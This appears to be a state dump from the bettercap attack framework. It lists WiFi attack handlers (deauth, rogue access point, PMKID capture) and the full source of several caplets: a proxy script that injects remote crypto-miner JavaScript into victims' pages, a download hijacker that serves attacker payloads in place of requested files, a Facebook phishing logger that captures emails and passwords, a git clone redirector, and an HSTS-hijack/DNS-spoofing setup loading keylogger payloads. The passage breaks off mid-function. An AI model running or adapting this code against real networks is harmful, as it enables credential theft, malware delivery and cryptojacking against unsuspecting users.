        'author': 'Simone Margaritelli <evilsocket@gmail.com> && Gianluca Braga <matrix86@gmail.com>',
        'parameters': {
            'wifi.ap.bssid': {
                'name': 'wifi.ap.bssid',
                'type': 0,
                'description': 'BSSID of the fake access point.',
                'default_value': '<random mac>',
                'current_value': '1f:4a:8a:fa:d2:d4',
                'validator': '[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}'
            },
            'wifi.ap.channel': {
                'name': 'wifi.ap.channel',
                'type': 2,
                'description': 'Channel of the fake access point.',
                'default_value': '1',
                'current_value': '1',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.ap.encryption': {
                'name': 'wifi.ap.encryption',
                'type': 1,
                'description': "If true, the fake access point will use WPA2, otherwise it'll result as an open AP.",
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'wifi.ap.ssid': {
                'name': 'wifi.ap.ssid',
                'type': 0,
                'description': 'SSID of the fake access point.',
                'default_value': 'FreeWiFi',
                'current_value': 'FreeWiFi',
                'validator': ''
            },
            'wifi.ap.ttl': {
                'name': 'wifi.ap.ttl',
                'type': 2,
                'description': 'Seconds of inactivity for an access points to be considered not in range anymore.',
                'default_value': '300',
                'current_value': '300',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.assoc.acquired': {
                'name': 'wifi.assoc.acquired',
                'type': 1,
                'description': "Send association to AP's for which key material was already acquired.",
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.assoc.open': {
                'name': 'wifi.assoc.open',
                'type': 1,
                'description': 'Send association requests to open networks.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.assoc.silent': {
                'name': 'wifi.assoc.silent',
                'type': 1,
                'description': 'If true, messages from wifi.assoc will be suppressed.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.assoc.skip': {
                'name': 'wifi.assoc.skip',
                'type': 0,
                'description': 'Comma separated list of BSSID to skip while sending association requests.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'wifi.channel_switch_announce.silent': {
                'name': 'wifi.channel_switch_announce.silent',
                'type': 1,
                'description': 'If true, messages from wifi.channel_switch_announce will be suppressed.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.deauth.acquired': {
                'name': 'wifi.deauth.acquired',
                'type': 1,
                'description': "Send wifi deauth packets from AP's for which key material was already acquired.",
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.deauth.open': {
                'name': 'wifi.deauth.open',
                'type': 1,
                'description': 'Send wifi deauth packets to open networks.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'wifi.deauth.silent': {
                'name': 'wifi.deauth.silent',
                'type': 1,
                'description': 'If true, messages from wifi.deauth will be suppressed.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.deauth.skip': {
                'name': 'wifi.deauth.skip',
                'type': 0,
                'description': 'Comma separated list of BSSID to skip while sending deauth packets.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'wifi.fake_auth.silent': {
                'name': 'wifi.fake_auth.silent',
                'type': 1,
                'description': 'If true, messages from wifi.fake_auth will be suppressed.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.handshakes.aggregate': {
                'name': 'wifi.handshakes.aggregate',
                'type': 1,
                'description': 'If true, all handshakes will be saved inside a single file, otherwise a folder with per-network pcap files will be created.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'wifi.handshakes.file': {
                'name': 'wifi.handshakes.file',
                'type': 0,
                'description': 'File path of the pcap file to save handshakes to.',
                'default_value': '~/bettercap-wifi-handshakes.pcap',
                'current_value': '~/bettercap-wifi-handshakes.pcap',
                'validator': ''
            },
            'wifi.hop.period': {
                'name': 'wifi.hop.period',
                'type': 2,
                'description': "If channel hopping is enabled (empty wifi.recon.channel), this is the time in milliseconds the algorithm will hop on every channel (it'll be doubled if both 2.4 and 5.0 bands are available).",
                'default_value': '250',
                'current_value': '250',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.interface': {
                'name': 'wifi.interface',
                'type': 0,
                'description': 'If filled, will use this interface name instead of the one provided by the -iface argument or detected automatically.',
                'default_value': '',
                'current_value': 'wlan1',
                'validator': ''
            },
            'wifi.region': {
                'name': 'wifi.region',
                'type': 0,
                'description': 'Set the WiFi region to this value before activating the interface.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'wifi.rssi.min': {
                'name': 'wifi.rssi.min',
                'type': 2,
                'description': 'Minimum WiFi signal strength in dBm.',
                'default_value': '-200',
                'current_value': '-200',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.show.filter': {
                'name': 'wifi.show.filter',
                'type': 0,
                'description': 'Defines a regular expression filter for wifi.show',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'wifi.show.limit': {
                'name': 'wifi.show.limit',
                'type': 2,
                'description': 'Defines limit for wifi.show',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.show.manufacturer': {
                'name': 'wifi.show.manufacturer',
                'type': 1,
                'description': 'If true, wifi.show will also show the devices manufacturers.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'wifi.show.sort': {
                'name': 'wifi.show.sort',
                'type': 0,
                'description': 'Defines sorting field (rssi, bssid, essid, channel, encryption, clients, seen, sent, rcvd) and direction (asc or desc) for wifi.show',
                'default_value': 'rssi asc',
                'current_value': 'rssi asc',
                'validator': '(rssi|bssid|essid|channel|encryption|clients|seen|sent|rcvd) (desc|asc)'
            },
            'wifi.skip-broken': {
                'name': 'wifi.skip-broken',
                'type': 1,
                'description': 'If true, dot11 packets with an invalid checksum will be skipped.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'wifi.source.file': {
                'name': 'wifi.source.file',
                'type': 0,
                'description': 'If set, the wifi module will read from this pcap file instead of the hardware interface.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'wifi.sta.ttl': {
                'name': 'wifi.sta.ttl',
                'type': 2,
                'description': 'Seconds of inactivity for a client station to be considered not in range or not connected to its access point anymore.',
                'default_value': '300',
                'current_value': '300',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'wifi.txpower': {
                'name': 'wifi.txpower',
                'type': 2,
                'description': 'Set WiFi transmission power to this value before activating the interface.',
                'default_value': '30',
                'current_value': '30',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'wifi.recon on',
            'description': 'Start 802.11 wireless base stations discovery and channel hopping.',
            'parser': ''
        }, {
            'name': 'wifi.recon off',
            'description': 'Stop 802.11 wireless base stations discovery and channel hopping.',
            'parser': ''
        }, {
            'name': 'wifi.clear',
            'description': 'Clear all access points collected by the WiFi discovery module.',
            'parser': ''
        }, {
            'name': 'wifi.recon MAC',
            'description': 'Set 802.11 base station address to filter for.',
            'parser': 'wifi.recon ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))'
        }, {
            'name': 'wifi.recon clear',
            'description': 'Remove the 802.11 base station filter.',
            'parser': ''
        }, {
            'name': 'wifi.client.probe.sta.filter FILTER',
            'description': "Use this regular expression on the station address to filter client probes, 'clear' to reset the filter.",
            'parser': 'wifi.client.probe.sta.filter (.+)'
        }, {
            'name': 'wifi.client.probe.ap.filter FILTER',
            'description': "Use this regular expression on the access point name to filter client probes, 'clear' to reset the filter.",
            'parser': 'wifi.client.probe.ap.filter (.+)'
        }, {
            'name': 'wifi.deauth BSSID',
            'description': "Start a 802.11 deauth attack, if an access point BSSID is provided, every client will be deauthenticated, otherwise only the selected client. Use 'all', '*' or a broadcast BSSID (ff:ff:ff:ff:ff:ff) to iterate every access point with at least one client and start a deauth attack for each one.",
            'parser': 'wifi\\.deauth ((?:[a-fA-F0-9:]{11,})|all|\\*)'
        }, {
            'name': 'wifi.probe BSSID ESSID',
            'description': 'Sends a fake client probe with the given station BSSID, searching for ESSID.',
            'parser': 'wifi\\.probe\\s+([a-fA-F0-9:]{11,})\\s+([^\\s].+)'
        }, {
            'name': 'wifi.channel_switch_announce bssid channel ',
            'description': 'Start a 802.11 channel hop attack, all client will be force to change the channel lead to connection down.',
            'parser': 'wifi\\.channel_switch_announce ((?:[a-fA-F0-9:]{11,}))\\s+((?:[0-9]+))'
        }, {
            'name': 'wifi.fake_auth bssid client',
            'description': 'send an fake authentication with client mac to ap lead to client disconnect',
            'parser': 'wifi\\.fake_auth ((?:[a-fA-F0-9:]{11,}))\\s+((?:[a-fA-F0-9:]{11,}))'
        }, {
            'name': 'wifi.assoc BSSID',
            'description': "Send an association request to the selected BSSID in order to receive a RSN PMKID key. Use 'all', '*' or a broadcast BSSID (ff:ff:ff:ff:ff:ff) to iterate for every access point.",
            'parser': 'wifi\\.assoc ((?:[a-fA-F0-9:]{11,})|all|\\*)'
        }, {
            'name': 'wifi.ap',
            'description': 'Inject fake management beacons in order to create a rogue access point.',
            'parser': ''
        }, {
            'name': 'wifi.show.wps BSSID',
            'description': "Show WPS information about a given station (use 'all', '*' or a broadcast BSSID for all).",
            'parser': 'wifi\\.show\\.wps ((?:[a-fA-F0-9:]{11,})|all|\\*)'
        }, {
            'name': 'wifi.show',
            'description': 'Show current wireless stations list (default sorting by essid).',
            'parser': ''
        }, {
            'name': 'wifi.recon.channel CHANNEL',
            'description': "WiFi channels (comma separated) or 'clear' for channel hopping.",
            'parser': 'wifi\\.recon\\.channel[\\s]+([0-9]+(?:[, ]+[0-9]+)*|clear)'
        }],
        'running': True,
        'state': {
            'channels': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
        }
    }, {
        'name': 'wol',
        'description': 'A module to send Wake On LAN packets in broadcast or to a specific MAC.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {},
        'handlers': [{
            'name': 'wol.eth MAC',
            'description': 'Send a WOL as a raw ethernet packet of type 0x0847 (if no MAC is specified, ff:ff:ff:ff:ff:ff will be used).',
            'parser': 'wol.eth(\\s.+)?'
        }, {
            'name': 'wol.udp MAC',
            'description': 'Send a WOL as an IPv4 broadcast packet to UDP port 9 (if no MAC is specified, ff:ff:ff:ff:ff:ff will be used).',
            'parser': 'wol.udp(\\s.+)?'
        }],
        'running': False,
        'state': {}
    }],
    'caplets': [{
        'path': '/usr/share/bettercap/caplets/ap.cap',
        'size': 570,
        'code': ['# interface to use to create the AP', 'set wifi.ap.interface wlx00c0ca96e4b2', '# interface for upstream connectivity, comment to disable', 'set wifi.ap.upstream wlp1s0', '# comment to create a free access point', 'set wifi.ap.passphrase 12345678', '', '# enable the ap', 'wifi.ap on', '', '# wait 2 seconds then set the session interface to the AP one', 'sleep 2', 'iface wlx00c0ca96e4b2', '', 'set net.sniff.local true', 'set net.sniff.verbose false', 'set net.sniff.filter not arp and not udp port 53', '', '# start recon for clients', 'net.recon on', '# sniff', 'net.sniff on', "# run the https-ui caplet because it's cool", 'https-ui'],
        'name': 'ap',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/crypto-miner/crypto-miner.cap',
        'size': 666,
        'code': ['# this module lets you inject a javascript crypto miner', '#', '# targeting the whole subnet by default, to make it selective:', '#', '#   sudo ./bettercap -caplet crypto-miner.cap -eval "set arp.spoof.targets 192.168.1.64"', '', '', '# set the name of the Miner: coinhive, cryptoloot or coinimp', 'set cryptominer.name coinhive', '', '# set the key of the Miner', 'set cryptominer.key 123456789', '', '# inject js miner', 'set http.proxy.script crypto-miner.js', '', '# uncomment if you want sslstrip enabled', '#set http.proxy.sslstrip true', '', '# redirect http traffic to a proxy', 'http.proxy on', '', '# wait for everything to start properly', 'sleep 1', '', '# make sure probing is off as it conflicts with arp spoofing', 'arp.spoof on'],
        'name': 'crypto-miner/crypto-miner',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/crypto-miner/crypto-miner.js',
            'size': 1842,
            'code': ['var green   = "\\033[32m",', '    reset   = "\\033[0m"', '', 'function onLoad() {', '    logStr = "Javascript Crypto Miner loaded.\\n" +', '             "\\n    Miner: " + green + env["cryptominer.name"].charAt(0).toUpperCase() + env["cryptominer.name"].slice(1) + reset +', '             "\\n    Targets: " + green + env["arp.spoof.targets"] + reset + "\\n"', '    log(logStr);', '}', '', 'function onResponse(req, res) {', "    if( res.ContentType.indexOf('text/html') == 0 ){", '        var body = res.ReadBody();', "        if( body.indexOf('</head>') != -1 ) {", '            switch(env["cryptominer.name"]) {', '                case "coinhive":', '                    res.Body = body.replace( ', "                        '</head>', ", '                        \'<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>\',', '                        \'<script> var miner = new CoinHive.Anonymous(\' + env["cryptominer.key"] + \'); miner.start(); </script></head>\'', '                    );', '                    break;', '                case "cryptoloot":', '                    res.Body = body.replace( ', "                        '</head>', ", '                        \'<script type="text/javascript" src="https://crypto-loot.com/lib/miner.min.js"></script>\',', '                        \'<script> var miner = new CryptoLoot.Anonymous(\' + env["cryptominer.key"] + \'); miner.start(); </script></head>\'', '                    );', '                    break;', '                case "coinimp":', '                    res.Body = body.replace( ', "                        '</head>', ", '                        \'<script type="text/javascript" src="https://www.freecontent.date./tSPw.js"></script>\',', '                        \'<script> var miner = new Client.Anonymous(\' + env["cryptominer.key"] + \'); miner.start(); </script></head>\'', '                    );', '                    break;', '            }', '        }', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/download-autopwn/download-autopwn.cap',
        'size': 2567,
        'code': ['# documentation can be found at https://github.com/bettercap/blob/master/download-autopwn/README.md', '# ', '# this module lets you intercept very specific download requests and replaces the payload with one of your choice', '#', '# in order for a download to get intercepted:', "#    1. the victim's user-agent string must match the downloadautopwn.useragent.x regexp value", '#    2. the requested file must match one of the downloadautopwn.extensions.x file extensions', '#', '# you can find the downloadautopwn.devices in the download-autopwn/ folder (you can add your own)', '#', '', '# choose the devices from which downloads get pwned (enter the dir names of choice from download-autopwn/)', '# (or feel free to add your own)', 'set downloadautopwn.devices android,ios,linux,macos,ps4,windows,xbox', '', "# choose the regexp value that the victim's User-Agent has to match", '# (feel free to add your own)', 'set downloadautopwn.useragent.android  Android', 'set downloadautopwn.useragent.ios      iPad|iPhone|iPod', 'set downloadautopwn.useragent.linux    Linux', 'set downloadautopwn.useragent.macos    Intel Mac OS X 10_', 'set downloadautopwn.useragent.ps4      PlayStation 4', 'set downloadautopwn.useragent.windows  Windows|WOW64', 'set downloadautopwn.useragent.xbox     Xbox', '', '# choose which file extensions get intercepted and replaced by your payload on specific devices (payloads are in download-autopwn/.../)', '# (again, you can add as many as you want)', '# make sure the payload files exist and that they are all named "payload" (for example: payload.exe)', 'set downloadautopwn.extensions.android  apk,pdf,sh,pfx,zip', 'set downloadautopwn.extensions.ios      ipa,ios,ipb,ipsw,ipsx,ipcc,mobileconfig,pdf,zip', 'set downloadautopwn.extensions.linux    c,go,sh,py,rb,cr,pl,deb,pdf,jar,zip', 'set downloadautopwn.extensions.macos    app,dmg,doc,docx,jar,ai,ait,psd,pdf,c,go,sh,py,rb,pl,terminal,zip', 'set downloadautopwn.extensions.ps4      disc,pup,pdf,doc,docx,zip', 'set downloadautopwn.extensions.windows  exe,msi,bat,jar,dll,doc,docx,swf,psd,ai,ait,pdf,rar,zip', 'set downloadautopwn.extensions.xbox     exe,msi,jar,pdf,doc,docx,zip', '', "# choose whether the proxy module resizes your payload to the requested file's size (if not set then default=false)", 'set downloadautopwn.resizepayloads true', '', '# set download-autopwn.js as proxy script', 'set http.proxy.script download-autopwn.js', '# uncomment if you want sslstrip enabled', '# set http.proxy.sslstrip true', '# start proxy', 'http.proxy on', '', '# wait for everything to start properly', 'sleep 1', '', '# uncomment if you want arp spoofing (make sure probing is off as it conflicts with arp spoofing)', '# arp.spoof on'],
        'name': 'download-autopwn/download-autopwn',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/download-autopwn/download-autopwn.js',
            'size': 3736,
            'code': ['var targets = {}', '', 'var nullbyte = "\\u0000"', '', 'var green   = "\\033[32m",', '    boldRed = "\\033[1;31m",', '    onRed   = "\\033[41m",', '    reset   = "\\033[0m",', '    redLine = "\\n  " + onRed + " " + reset', '', 'function onLoad() {', '\tdevices = env["downloadautopwn.devices"].split(",")', '\tlogStr = ""', '\tfor (var i = 0; i < devices.length; i++) {', '\t\titem = {', '\t\t\t"device": devices[i],', '\t\t\t"useragent": env[ "downloadautopwn.useragent." + devices[i] ],', '\t\t\t"extensions": env[ "downloadautopwn.extensions." + devices[i] ].toLowerCase().split(",")', '\t\t}', '\t\ttargets[i] = item', '\t\tlogStr += "\\n  " + green + targets[i]["device"] + reset +', '\t\t          "\\n    User-Agent: " + targets[i]["useragent"] + ', '\t\t          "\\n    Extensions: " + targets[i]["extensions"] + "\\n"', '\t}', '\tlog("Download Autopwn loaded.\\n\\nDownload Autopwn targets: \\n" + logStr)', '}', '', 'function onResponse(req, res) {', '\t// First of all check whether the requested path might have an extension (to save cpu)', '\tvar requestedFileName = req.Path.replace(/.*\\//g, "")', '\tif ( requestedFileName.indexOf(".") != -1 ) {', '\t\tvar userAgent = req.GetHeader("User-Agent", ""),', '\t\t    extension', '\t\t// Iterate through targets', '\t\tfor ( var t = 0; t < Object.keys(targets).length; t++ ) {', '\t\t\t// Check if User-Agent is a target', '\t\t\tregex = new RegExp(targets[t]["useragent"])', '\t\t\tif ( userAgent.match(regex) ) {', '\t\t\t\t// Iterate through target extensions', '\t\t\t\tfor (var e = 0; e < targets[t]["extensions"].length; e++) {', '\t\t\t\t\t// Check if requested path contains a targeted extension', '\t\t\t\t\t// function endsWith() could be a nice simplification here', '\t\t\t\t\tif ( requestedFileName.replace(/.*\\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {', '\t\t\t\t\t\textension = targets[t]["extensions"][e]', '\t\t\t\t\t\t// Autopwn', '\t\t\t\t\t\tlogStr = "\\n" + redLine + "  Autopwning download request from " + boldRed + req.Client.IP + reset + ', '\t\t\t\t\t\t         redLine + ', '\t\t\t\t\t\t         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + ', '\t\t\t\t\t\t         redLine + ', '\t\t\t\t\t\t         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."', '\t\t\t\t\t\t// Check our payload size', '\t\t\t\t\t\tpayload = readFile("/usr/share/bettercap/caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)', '\t\t\t\t\t\tpayloadSize = payload.length', '\t\t\t\t\t\tlogStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"', '\t\t\t\t\t\t// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload', '\t\t\t\t\t\tif ( env["downloadautopwn.resizepayloads"] == "true" ) {', '\t\t\t\t\t\t\t// Check requested file size', '\t\t\t\t\t\t\trequestedFileSize = parseInt(res.GetHeader("Content-Length", "0"))', '\t\t\t\t\t\t\tif (requestedFileSize == 0) {', '\t\t\t\t\t\t\t\trequestedFileSize = res.ReadBody().length', '\t\t\t\t\t\t\t}', '\t\t\t\t\t\t\tlogStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"', '\t\t\t\t\t\t\t// Append nullbytes if required', '\t\t\t\t\t\t\tif (requestedFileSize > payloadSize) {', '\t\t\t\t\t\t\t\tlogStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."', '\t\t\t\t\t\t\t\tsizeDifference = requestedFileSize - payloadSize', '\t\t\t\t\t\t\t\tnullbyteString = Array(sizeDifference + 1).join(nullbyte)', '\t\t\t\t\t\t\t\tpayload += nullbyteString', '\t\t\t\t\t\t\t}', '\t\t\t\t\t\t}', '\t\t\t\t\t\t// Set Content-Disposition header to enforce file download instead of in-browser preview', '\t\t\t\t\t\tres.SetHeader("Content-Disposition", "attachment; filename=\\"" + requestedFileName + "\\"")', '\t\t\t\t\t\t// Update Content-Length header', '\t\t\t\t\t\tres.RemoveHeader("Content-Length")', '\t\t\t\t\t\tlogStr += redLine + ', '\t\t\t\t\t\t          redLine + "  Serving your payload to " + boldRed + req.Client.IP + reset + "...\\n"', '\t\t\t\t\t\tlog(logStr)', '\t\t\t\t\t\tres.Body = payload', '\t\t\t\t\t}', '\t\t\t\t}', '\t\t\t}', '\t\t}', '\t}', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/fb-phish/fb-phish.cap',
        'size': 140,
        'code': ['set http.server.address 0.0.0.0', 'set http.server.path www/www.facebook.com/', '', 'set http.proxy.script fb-phish.js', '', 'http.proxy on', 'http.server on'],
        'name': 'fb-phish/fb-phish',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/fb-phish/fb-phish.js',
            'size': 842,
            'code': ['var RESET = "\\033[0m";', '', 'function R(s) {', '    return "\\033[31m" + s + RESET;', '}', '', 'function B(s) {', '    return "\\033[34m" + s + RESET;', '}', '', 'function onRequest(req, res) {', '    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {', '        var form = req.ParseForm();', '        var email = form["email"] || "?", ', '            pass  = form["pass"] || "?";', '', '        log( R(req.Client.IP), " > FACEBOOK > email:", B(email), " pass:\'" + B(pass) + "\'" );', '', '        headers = res.Headers.split("\\r\\n")', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "")', '            res.RemoveHeader(header_name)', '        }', '        res.Status = 301;', '        res.SetHeader("Location", "https://www.facebook.com")', '        res.SetHeader("Connection", "close")', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/gitspoof/gitspoof.cap',
        'size': 216,
        'code': ['set http.server.path caplets/gitspoof/evil_git_repo', 'http.server on', '', 'set http.proxy.script caplets/gitspoof/gitspoof.js', 'set https.proxy.script caplets/gitspoof/gitspoof.js', 'http.proxy on', 'https.proxy on', '', '# arp.spoof on'],
        'name': 'gitspoof/gitspoof',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/gitspoof/gitspoof.js',
            'size': 1002,
            'code': ['var gitspoof_repo = undefined;', '', 'var red    = "\\033[31m",', '    yellow = "\\033[33m",', '    green  = "\\033[32m",', '    bold   = "\\033[1;37m",', '    reset  = "\\033[0m"', '', 'function onLoad() {', '    env["gitspoof.repo"] ? gitspoof_repo = env["gitspoof.repo"] : gitspoof_repo = env["iface.ipv4"];', '    log( "Gitspoof loaded" );', '    log(green +"Git redirect to repo: " + yellow + gitspoof_repo + "/" + reset);', '}', '', 'function onResponse(req, res) {', "    if (req.Query == 'service=git-upload-pack') {", '        log(bold + "Got git clone request, attempting redirect" + reset);', '    }', "    if (req.Query == 'service=git-upload-pack' && req.Hostname != gitspoof_repo) {", '        res.Status = 301;', '        headers = res.Headers.split("\\r\\n");', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "");', '            res.RemoveHeader(header_name);', '        }', '        res.SetHeader("Location", "http://" + gitspoof_repo + "/info/refs?service=git-upload-pack");', '        res.Body = "";', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/gps.cap',
        'size': 109,
        'code': ['gps on', '', '# https://www.waveshare.com/wiki/GSM/GPRS/GNSS_HAT', '!echo "AT+CGNSPWR=1\\nAT+CGNSTST=1" > /dev/ttyUSB0'],
        'name': 'gps',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/hstshijack/hstshijack.cap',
        'size': 1203,
        'code': ['# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack', '', "# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'", "# variables get precendence over those assigned to the 'hstshijack.ignore' variable.", 'set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com', 'set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn', 'set hstshijack.ssl.domains     /usr/share/bettercap/caplets/hstshijack/domains.txt', 'set hstshijack.ssl.index       /usr/share/bettercap/caplets/hstshijack/index.json', 'set hstshijack.ssl.check       true', '#set hstshijack.blockscripts    example.com,*.example.com', 'set hstshijack.obfuscate       true', 'set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js', '#set hstshijack.ignore          *', '', 'set http.proxy.script  /usr//share/bettercap/caplets/hstshijack/hstshijack.js', 'http.proxy on', '', 'set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn', 'set dns.spoof.all      true', 'dns.spoof on'],
        'name': 'hstshijack/hstshijack',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/hstshijack/hstshijack.js',
            'size': 41360,
            'code': ['/*', ' * Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack', ' */', '', 'var ssl = {', '  "domains": [],', '  "index": {},', '  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz"', '};', '', 'var payload,', '    payload_container_prefix = (', '      "if (!globalThis.{{SESSION_ID_TAG}}) {\\n" +', '         "globalThis.{{SESSION_ID_TAG}} = function() {\\n"),', '    payload_container_suffix = (', '         "\\n}\\n" +', '         "globalThis.{{SESSION_ID_TAG}}();\\n" +', '      "}\\n");', '', 'var ignore_hosts       = [],', '    target_hosts       = [],', '    replacement_hosts  = [],', '    block_script_hosts = [];', '', 'var payloads = {},', '    obfuscate;', '', 'var callback_path,', '    whitelist_path,', '    ssl_index_path,', '    session_id,', '    varname_target_hosts,', '    varname_replacement_hosts;', '', 'var math_seed;', '', 'var whitelist = {};', '', 'var red      = "\\033[31m",', '    yellow   = "\\033[33m",', '    green    = "\\033[32m",', '    blue     = "\\033[34m",', '    on_white = "\\033[47;30m",', '    on_grey  = "\\033[40;37m",', '    on_blue  = "\\033[104;30m",', '    bold     = "\\033[1;37m",', '    reset    = "\\033[0m";', '', 'function randomFloat() {', '  r = Math.sin(math_seed++) * 10000;', '  return r - Math.floor(r);', '}', '', 'function randomString(length) {', '  length = parseInt(length);', '  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",', '      buff  = new Array(length);', '  for (var a = 0; a < buff.length; a++) {', '    index = parseInt(Math.random() * chars.length);', '    buff[a] = chars.charAt(index)', '  }', '  return buff.join("");', '}', '', 'function toRegexp(selector_string, replacement_string) {', '  selector_string = selector_string.replace(/\\./g, "\\\\.");', '  selector_string = selector_string.replace(/\\-/g, "\\\\-");', '  return [', '    new RegExp("(^|[^a-z0-9-.])" + selector_string + "($|[^a-z0-9-.])", "ig"),', '    "$1" + replacement_string + "$2"', '  ];', '}', '', 'function toWholeRegexp(selector_string, replacement_string) {', '  selector_string = selector_string.replace(/\\./g, "\\\\.");', '  selector_string = selector_string.replace(/\\-/g, "\\\\-");', '  return [', '    new RegExp("^" + selector_string + "$", "ig"),', '    replacement_string', '  ];', '}', '', 'function toWildcardRegexp(selector_string, replacement_string) {', '  selector_string = selector_string.replace(/\\-/g, "\\\\-");', '  if (selector_string.match(/^\\*./)) {', '    selector_string = selector_string.replace(/^\\*\\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");', '    selector_string = selector_string.replace(/\\./g, "\\\\.");', '    replacement_string = replacement_string.replace(/^\\*\\./, "");', '    return [', '      new RegExp(selector_string, "ig"),', '      "$1" + replacement_string', '    ];', '  } else if (selector_string.match(/\\.\\*$/)) {', '    selector_string = selector_string.replace(/\\.\\*$/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");', '    selector_string = selector_string.replace(/\\./g, "\\\\.");', '    replacement_string = replacement_string.replace(/\\.\\*$/, "");', '    return [', '      new RegExp(selector_string, "ig"),', '      replacement_string + "$1"', '    ];', '  } else {', '    log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").");', '  }', '}', '', 'function toWholeWildcardRegexp(selector_string, replacement_string) {', '  selector_string = selector_string.replace(/\\-/g, "\\\\-");', '  if (selector_string.match(/^\\*./)) {', '    selector_string = selector_string.replace(/^\\*\\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");', '    selector_string = selector_string.replace(/\\./g, "\\\\.");', '    replacement_string = replacement_string.replace(/^\\*\\./, "");', '    return [', '      new RegExp("^" + selector_string + "$", "ig"),', '      "$1" + replacement_string', '    ];', '  } else if (selector_string.match(/\\.\\*$/)) {', '    selector_string = selector_string.replace(/\\.\\*/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");', '    selector_string = selector_string.replace(/\\./g, "\\\\.");', '    replacement_string = replacement_string.replace(/\\.\\*$/, "");', '    return [', '      new RegExp(selector_string, "ig"),', '      replacement_string + "$1"', '    ];', '  } else {', '    log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").");', '  }', '}', '', '/* Matches /(^|[^a-z0-9-.])example\\.com($|[^a-z0-9-.])/ig */', 'function toRegexpSet(selector_string, replacement_string) {', '  if 